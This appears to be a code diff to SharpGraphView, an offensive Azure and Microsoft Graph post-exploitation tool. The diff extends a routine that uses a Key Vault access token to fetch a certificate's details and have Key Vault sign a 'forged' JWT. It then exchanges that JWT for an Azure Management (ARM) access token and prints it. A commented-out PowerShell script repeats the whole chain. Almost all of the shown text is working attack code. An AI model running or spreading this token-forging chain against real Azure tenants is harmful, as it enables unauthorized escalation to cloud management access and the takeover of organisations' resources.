@@ -13,6 +13,11 @@ using Microsoft.IdentityModel.Tokens;
 using System.IdentityModel.Tokens.Jwt;
 using System.Security.Claims;
 using System.Security.Cryptography;
+using System.Collections.ObjectModel;
+using System.Management.Automation;
+using Newtonsoft.Json;
+using System.Management.Automation.Language;
+
 
 namespace SharpGraphView
 {
@@ -51,7 +56,7 @@ Auth:
     Invoke-RefreshToAzureManagementToken     - Convert refresh token to Azure Management token (saved to az_tokens.txt)
     Invoke-RefreshToVaultToken               - Convert refresh token to Azure Vault token (saved to vault_tokens.txt)
     Invoke-CertToAccessToken                 - Convert Azure Application certificate to JWT access token (saved to cert_tokens.txt)
-    New-SignedJWT                            - Construct JWT and sign using a Key Vault certificate (Azure Key Vault access token required)
+    New-SignedJWT                            - Construct JWT and sign using Key Vault certificate (Azure Key Vault access token required) then generate Azure Management (ARM) token
 
 Post-Auth:
 
@@ -218,6 +223,7 @@ Examples:
             }
         }
 
+
         // JWT/Vault cert functions
         public static async Task ExecuteNewSignedJWT()
         {
@@ -239,6 +245,7 @@ Examples:
         {
             using (var httpClient = new HttpClient())
             {
+                // Certificate details
                 string uri = $"{kvURI}/certificates?api-version=7.3";
 
                 httpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", accessToken);
@@ -275,13 +282,12 @@ Examples:
                     kid = kidValue.Value.ToString();
                 }
 
-                Console.WriteLine("\n[+] Certificate details obtained:");
+                Console.WriteLine("\n[+] Certificate Details Obtained!");
                 Console.WriteLine(certificate.ToString());
 
 
-
                 // Create JWT
-                Console.WriteLine("\n[+] Creating JWT:");
+                Console.WriteLine("\n[+] Forged JWT:");
                 string appId = Config.id;
                 string tenant = Config.tenant;
                 string audience = $"https://login.microsoftonline.com/{tenant}/oauth2/token";
@@ -295,19 +301,19 @@ Examples:
 
                 Dictionary<string, string> jwtHeader = new Dictionary<string, string>
                 {
-                    { "x5t", x5t }, // The pubkey hash we received from Azure Key Vault
-                    { "typ", "JWT" },   // We want a JWT
-                    { "alg", "RS256" } // Use RSA encryption and SHA256 as hashing algorithm
+                    { "x5t", x5t }, // pubkey hash from Azure Key Vault
+                    { "typ", "JWT" },   // we want JWT
+                    { "alg", "RS256" } // RSA enc and SHA256 as hashing algo
                 };
 
                 Dictionary<string, object> jwtPayload = new Dictionary<string, object>
                 {
 
-                    { "exp", jwtExpiration },    // Expiration of JWT request
-                    { "sub", appId },             // Subject
-                    { "nbf", notBefore },        // This should not be used before this timestam
-                    { "jti", Guid.NewGuid() },   // Random GUID
-                    { "aud", audience },         // Points to oauth token request endpoint for your tenant
+                    { "exp", jwtExpiration }, 
+                    { "sub", appId },             
+                    { "nbf", notBefore },       
+                    { "jti", Guid.NewGuid() },   // random GUID
+                    { "aud", audience },         // oauth token request endpoint for your tenant
                     { "iss", appId },            // The AppID for which we request a token for
                 };
 
@@ -338,7 +344,7 @@ Examples:
                 });
                 var content = new StringContent(requestBody.ToString(), Encoding.UTF8, "application/json");
                 HttpResponseMessage newResponse = await httpClient.PostAsync(newUri, content);
-                response.EnsureSuccessStatusCode();
+                newResponse.EnsureSuccessStatusCode();
                 responseContent = await newResponse.Content.ReadAsStringAsync();
                 JObject responseBody = JObject.Parse(responseContent);
                 string signature = responseBody["value"].ToString();
@@ -348,9 +354,7 @@ Examples:
 
 
                 // Request Azure Management token
-                Console.WriteLine("\n[+] Requesting Azure Management Token: ");
-
-                string jwtLogin = "https://login.microsoftonline.com/d6bd5a42-7c65-421c-ad23-a25a5d5fa57f/oauth2/v2.0/token";
+                string jwtLogin = $"https://login.microsoftonline.com/{Config.tenant}/oauth2/v2.0/token";
 
                 var parameters = new Dictionary<string, string>
                 {
@@ -375,19 +379,29 @@ Examples:
                         {
                             string errorContent = await responseJwt.Content.ReadAsStringAsync();
                             Console.WriteLine($"[-] Error: {responseJwt.StatusCode} ({(int)responseJwt.StatusCode}). {errorContent}");
-                            return; // Exit the method if there's an error
+                            return; 
                         }
 
+                        Console.WriteLine("\n[+] Azure Management Token Obtained!");
+                        Console.WriteLine($"[*] Application ID: {Config.id}");
+                        Console.WriteLine($"[*] Tenant ID: {Config.tenant}");
+                        Console.WriteLine($"[*] Scope: https://management.azure.com/.default");
+
                         string responseContentJWT = await responseJwt.Content.ReadAsStringAsync();
-                        Console.WriteLine(responseContentJWT); // Print the entire response content
+                        var responseDictionary = JsonConvert.DeserializeObject<Dictionary<string, string>>(responseContentJWT);
+
+                        foreach (var kvp in responseDictionary)
+                        {
+                            Console.WriteLine($"[*] {kvp.Key}: {kvp.Value}");
+                        }
                     }
                 }
             }
         }
 
 
-        static async Task Main(string[] args)
-        {
+            static async Task Main(string[] args)
+            {
             if (args.Length < 1)
             {
                 ShowHelp();
@@ -415,10 +429,10 @@ Examples:
                 string userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19042";
 
                 var body = new Dictionary<string, string>
-            {
-                { "client_id", clientId },
-                { "resource", resource }
-            };
+                {
+                    { "client_id", clientId },
+                    { "resource", resource }
+                };
 
                 using (var httpClient = new HttpClient())
                 {
@@ -906,6 +920,132 @@ Examples:
                 {
                     Console.WriteLine("\n[*] New-SignedJWT");
                     ExecuteNewSignedJWT().GetAwaiter().GetResult();
+
+                    // This WORKS too
+                    // - sharp functions above are sexy tho...
+                    /*string script = $@"
+                    function Get-AKVCertificate($kvURI, $AppKeyVaultToken, $keyName) {{
+                        $uri = ""$($kvURI)/certificates?api-version=7.3""
+                        $httpResponse = Invoke-WebRequest -Uri $uri -Headers @{{ 'Authorization' = ""Bearer $($AppKeyVaultToken)"" }}
+                        $certs    = $httpResponse.Content | ConvertFrom-Json
+                        $certUri  = $certs.Value | where {{$_.id -like ""*$($keyName)*""}}
+                        Write-Output $certUri
+                        $httpResponse = Invoke-WebRequest -Uri ""$($certUri.id)?api-version=7.3"" -Headers @{{ 'Authorization' = ""Bearer $($AppKeyVaultToken)"" }}
+                        return $httpResponse.Content | ConvertFrom-Json
+                    }} 
+
+                    $AKVCertificate = Get-AKVCertificate -kvURI '{Config.query}' -AppKeyVaultToken {Config.accessToken} -keyName '{Config.key}'
+
+                    function New-SignedJWT {{
+                        $AppID = ""{Config.id}""
+                        $audience = ""https://login.microsoftonline.com/{Config.tenant}/oauth2/token""
+
+                        # JWT request should be valid for max 2 minutes.
+                        $StartDate             = (Get-Date '1970-01-01T00:00:00Z').ToUniversalTime()
+                        $JWTExpirationTimeSpan = (New-TimeSpan -Start $StartDate -End (Get-Date).ToUniversalTime().AddMinutes(2)).TotalSeconds
+                        $JWTExpiration         = [math]::Round($JWTExpirationTimeSpan, 0)
+
+                        # Create a NotBefore timestamp. 
+                        $NotBeforeExpirationTimeSpan = (New-TimeSpan -Start $StartDate -End ((Get-Date).ToUniversalTime())).TotalSeconds
+                        $NotBefore                   = [math]::Round($NotBeforeExpirationTimeSpan, 0)
+
+                        # Create JWT header
+                        $jwtHeader = @{{
+                            'alg' = 'RS256'              # Use RSA encryption and SHA256 as hashing algorithm
+                            'typ' = 'JWT'                # We want a JWT
+                            'x5t' = $AKVCertificate.x5t[0]  # The pubkey hash we received from Azure Key Vault
+                        }}
+
+                        # Create the payload
+                        $jwtPayLoad = @{{
+                            'aud' = $audience            # Points to oauth token request endpoint for your tenant
+                            'exp' = $JWTExpiration       # Expiration of JWT request
+                            'iss' = $AppID  # The AppID for which we request a token for
+                            'jti' = [guid]::NewGuid()    # Random GUID
+                            'nbf' = $NotBefore           # This should not be used before this timestamp
+                            'sub' = $AppID  # Subject
+                        }}
+
+                        # Convert header and payload to json and to base64
+                        $jwtHeaderBytes  = [System.Text.Encoding]::UTF8.GetBytes(($jwtHeader | ConvertTo-Json))
+                        $jwtPayloadBytes = [System.Text.Encoding]::UTF8.GetBytes(($jwtPayLoad | ConvertTo-Json))
+                        $b64JwtHeader    = [System.Convert]::ToBase64String($jwtHeaderBytes)
+                        $b64JwtPayload   = [System.Convert]::ToBase64String($jwtPayloadBytes)
+
+                        # Concat header and payload to create an unsigned JWT and compute a Sha256 hash
+                        $unsignedJwt      = $b64JwtHeader + '.' + $b64JwtPayload
+                        $unsignedJwtBytes = [System.Text.Encoding]::UTF8.GetBytes($unsignedJwt)
+                        $hasher           = [System.Security.Cryptography.HashAlgorithm]::Create('sha256')
+                        $jwtSha256Hash    = $hasher.ComputeHash($unsignedJwtBytes)
+                        $jwtSha256HashB64 = [Convert]::ToBase64String($jwtSha256Hash) -replace '\\+', '-' -replace '/', '_' -replace '='
+
+                        # Sign the sha256 of the unsigned JWT using the certificate in Azure Key Vault
+                        $uri      = ""$($AKVCertificate.kid)/sign?api-version=7.3""
+                        $headers  = @{{
+                            'Authorization' = ""Bearer {Config.accessToken}""
+                            'Content-Type' = 'application/json'
+                        }}
+                        $response = Invoke-RestMethod -Uri $uri -UseBasicParsing -Method POST -Headers $headers -Body (([ordered] @{{
+                            'alg'   = 'RS256'
+                            'value' = $jwtSha256HashB64
+                        }}) | ConvertTo-Json)
+                        $signature = $response.value
+
+                        # Concat the signature to the unsigned JWT
+                        $signedJWT = $unsignedJwt + '.' + $signature
+
+                        return $signedJWT
+                    }}
+
+                    # Call the function and store the result
+                    $signedJWT = New-SignedJWT
+
+                    # Return the result for further processing
+                    Write-Output ""`n[+] Created signed JWT:""
+                    $signedJWT
+
+                    try {{
+                        $new = ""https://login.microsoftonline.com/{Config.tenant}/oauth2/v2.0/token""
+                        $headers  = @{{'Content-Type' = 'application/x-www-form-urlencoded'}}
+                        $response = Invoke-RestMethod -Uri $new -UseBasicParsing -Method POST -Headers $headers -Body ([ordered]@{{
+                            'client_id'             = $AppID
+                            'client_assertion'      = $signedJWT
+                            'client_assertion_type' = 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer'
+                            'scope'                 = 'https://management.azure.com/.default'
+                            'grant_type'            = 'client_credentials'
+                        }})
+                        
+                        $AppToken = ""$($response.access_token)""
+                        Write-Output ""`n[+] Azure Management token obtained""
+                        Write-Output ""[*] Application ID: {Config.id}""
+                        Write-Output ""[*] Tenant ID: {Config.tenant}""
+                        Write-Output ""[*] Scope: https://management.azure.com/.default""
+                        Write-Output ""[*] access_token:""
+                        $AppToken
+                    }}
+                    catch {{
+                        Write-Output ""[-] Error: $_""
+                    }}
+                    ";
+
+                    using (PowerShell ps = PowerShell.Create())
+                    {
+                        ps.AddScript(script);
+                        Collection<PSObject> output = ps.Invoke();
+                        foreach (PSObject obj in output)
+                        {
+                            Console.WriteLine(obj);
+                        }
+
+                        if (ps.Streams.Error.Count > 0)
+                        {
+                            Console.WriteLine("Errors:");
+                            foreach (var error in ps.Streams.Error)
+                            {
+                                Console.WriteLine(error.ToString());
+                            }
+                        }
+                    }*/
                 }
             }
 
